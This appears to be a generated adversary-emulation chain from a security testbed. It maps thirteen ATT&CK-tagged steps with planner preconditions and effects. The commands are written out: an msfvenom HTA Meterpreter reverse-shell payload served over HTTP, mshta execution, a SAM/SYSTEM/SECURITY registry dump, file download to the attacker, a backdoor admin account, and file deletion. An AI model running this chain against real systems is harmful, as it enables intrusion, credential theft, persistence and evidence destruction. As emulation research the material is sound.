# Chain 070

**Testbed**: `env0` · **Steps**: 13 · **Tactics touched**: Defense Evasion, Command and Control, Execution, Initial Access, Discovery, Credential Access, Collection, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Defense Evasion | T1218.005, T1071.001, T1204.002, T1070.004, T1485 |
| Command and Control | T1218.005, T1071.001 |
| Execution | T1071.001, T1218.005, T1204.002, T1059.003 |
| Initial Access | T1566.002 |
| Discovery | T1082 |
| Credential Access | T1003.002 |
| Collection | T1020 |
| Persistence | T1136.001 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Defense Evasion, Command and Control | T1218.005, T1071.001 | Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom | MSFVenom Console |
| 2 | Execution, Command and Control | T1071.001 | Set an MSF payload handler for a file-backed payload | Metasploit Executor |
| 3 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 4 | Defense Evasion, Execution | T1218.005, T1204.002 | Simulate the victim execute an HTA file on its machine | Human |
| 5 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 6 | Discovery | T1082 | Retrieve Environment Variable | Meterpreter Executor |
| 7 | Defense Evasion, Execution | T1218.005, T1204.002 | Simulate the victim execute an HTA file on its machine as Admin | Human |
| 8 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 9 | Execution | T1059.003 | Get an Interactive Shell on Windows | Meterpreter Session Derive |
| 10 | Credential Access | T1003.002 | Registry dump of SAM, creds, and secrets | Command Prompt Executor |
| 11 | Collection | T1020 | File Download Operation | Meterpreter Executor |
| 12 | Persistence | T1136.001 | Create a new Windows admin user | Command Prompt Executor |
| 13 | Defense Evasion, Impact | T1070.004, T1485 | Delete Remote File | Meterpreter Executor |

## Attack Steps (Detail)

### Step 1 — Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom

- **UUID**: `msfvenom-hta`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Defense Evasion, Command and Control
- **MITRE ID(s)**: T1218.005, T1071.001
- **Technique(s)**: System Binary Proxy Execution: Mshta, Application Layer Protocol: Web Protocols

**Description**

The command uses MSFVenom to generate an HTA (HTML Application) payload for a Meterpreter session. HTA files are opened by the Windows built-in `mshta.exe`, letting the payload run via a signed Microsoft binary (LOLBAS-style delivery). The `hta-psh` format wraps a PowerShell stager inside the HTA.

**Execution** (MSFVenom Console)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f hta-psh -o #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacker machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(hta-file ?file - file)`

---

### Step 2 — Set an MSF payload handler for a file-backed payload

- **UUID**: `set-msf-payload-handler-for-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Windows Command Shell, Ingress Tool Transfer, Non-Standard Por

**Description**

Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
for the case where the meterpreter payload has been (or will be) staged as a
file on the victim.

This variant additionally grants `(callback-covered ?file)` for the payload's
file — the gate that every execute-* action requires before running that file.
Payload-genesis actions (msfvenom) deliberately do NOT produce
`callback-covered`, so payload files are born uncovered; firing this action
is what makes them safe to execute. This forces the planner to sequence
handler-set before any execute-* on the payload file — the ordering
constraint is encoded directly in PDDL preconditions.

Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
loading, in-memory shellcode injection, staged callback with no on-disk
artifact.

**Execution** (Metasploit Executor)

```
exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
                            payload_module_name = "#{payload_name}",
                            listening_host = "#{LHOST}",
                            listening_port = "#{LPORT}"):
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | no |
| `LPORT` | listening port of the attacter machine | — | no |
| `payload_name` | payload type set by msf | — | no |

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`

**Effects**

- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 3 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 4 — Simulate the victim execute an HTA file on its machine

- **UUID**: `simulate-execute-hta-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Defense Evasion, Execution
- **MITRE ID(s)**: T1218.005, T1204.002
- **Technique(s)**: System Binary Proxy Execution: Mshta, User Execution: Malicious File

**Description**

This step simulates the victim opening an HTA (HTML Application) file via the Windows built-in `mshta.exe`. Because `mshta.exe` is a signed Microsoft binary trusted by many application-allow-listing policies, the HTA vehicle is a classic LOLBAS execution path (T1218.005).

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, use PowerShell or Command Prompt, or the Run dialog)
mshta.exe #{HTA_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `HTA_PATH` | Saved path of the HTA file on the victim machine | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(hta-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 5 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 6 — Retrieve Environment Variable

- **UUID**: `meterpreter-getenv`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `getenv` command retrieves the value of an environment variable on the remote target.

**Execution** (Meterpreter Executor)

```
getenv(var_name=#{name}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `name` | Name of the environment variable to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 7 — Simulate the victim execute an HTA file on its machine as Admin

- **UUID**: `simulate-execute-hta-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Defense Evasion, Execution
- **MITRE ID(s)**: T1218.005, T1204.002
- **Technique(s)**: System Binary Proxy Execution: Mshta, User Execution: Malicious File

**Description**

This step simulates the victim opening an HTA (HTML Application) file via `mshta.exe` **as Administrator** — either from an elevated Command Prompt / PowerShell, or by right-clicking `mshta.exe` and selecting "Run as administrator" and passing the HTA path. Because `mshta.exe` is a signed Microsoft binary, this is a LOLBAS-style elevated execution path (T1218.005).

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, open an ELEVATED PowerShell or Command Prompt)
mshta.exe #{HTA_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `HTA_PATH` | Saved path of the HTA file on the victim machine | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(hta-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 8 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 9 — Get an Interactive Shell on Windows

- **UUID**: `meterpreter-shell-windows`
- **Source**: Metasploit
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: {'Command and Scripting Interpreter': 'Windows Command Shell'}

**Description**

The `shell` command in a Windows meterpreter session drops into an interactive cmd.exe.

**Execution** (Meterpreter Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `executor_parent` | Parent meterpreter session ID | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 10 — Registry dump of SAM, creds, and secrets

- **UUID**: `art-t1003_002-reg-save-sam`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
target-side directory (default `%TEMP%`). The hives hold encrypted /
structured credential material — offline processing (impacket-
secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
modelled by this action. A chain that wants to close the credential-
access stage via this path must include downstream file exfil +
offline-parse actions. ART auto_generated_guid
5c2571d0-1572-416d-9676-812e64ca9f44.

**Execution** (Command Prompt Executor)

```
reg save HKLM\sam #{save_dir}\sam
reg save HKLM\system #{save_dir}\system
reg save HKLM\security #{save_dir}\security
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg save. | — | yes |
| `save_dir` | Directory on the target where the SAM / SYSTEM / SECURITY hives are written. | %TEMP% | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-in-file ?d - data ?f - file)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(callback-covered ?f - file)`

---

### Step 11 — File Download Operation

- **UUID**: `meterpreter-download`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Collection
- **MITRE ID(s)**: T1020
- **Technique(s)**: Data from Local System

**Description**

The `download` command transfers files from the target system to the attacker machine.

**Execution** (Meterpreter Executor)

```
download(remote_path=#{remote_path}, local_path=#{output_dir}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `remote_path` | Full path to remote file/directory | — | yes |
| `output_dir` | Local directory to save files | /tmp | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`
- `(file-exists ?remote_path - string ?file - file ?target - host)`

**Effects**

- `(file-on-attacker ?localpath - string ?file - file)`

---

### Step 12 — Create a new Windows admin user

- **UUID**: `art-t1136_001-net-user-admin`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1136.001
- **Technique(s)**: Create Account: Local Account

**Description**

Creates a new local account and adds it to the local `administrators`
group in one shot. Strong persistence pattern — attacker gains a
privileged backdoor account. ART auto_generated_guid
fda74566-a604-4581-a4cc-fbbe21d66559.

**Execution** (Command Prompt Executor)

```
net user /add "#{username}" "#{password}"
net localgroup administrators "#{username}" /add
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke net. | — | yes |
| `username` | Local admin account name to create. | BackupAdmin | yes |
| `password` | Password for the new admin account. | ComplexPass!23 | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(user-created ?u - user ?target - host)`

---

### Step 13 — Delete Remote File

- **UUID**: `meterpreter-delete`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: {'Indicator Removal': 'File Deletion'}, Data Destruction

**Description**

The `delete` command removes a file from the remote system.

**Execution** (Meterpreter Executor)

```
delete(file_path=#{RemotePath}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `RemotePath` | Remote path of the file to delete | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
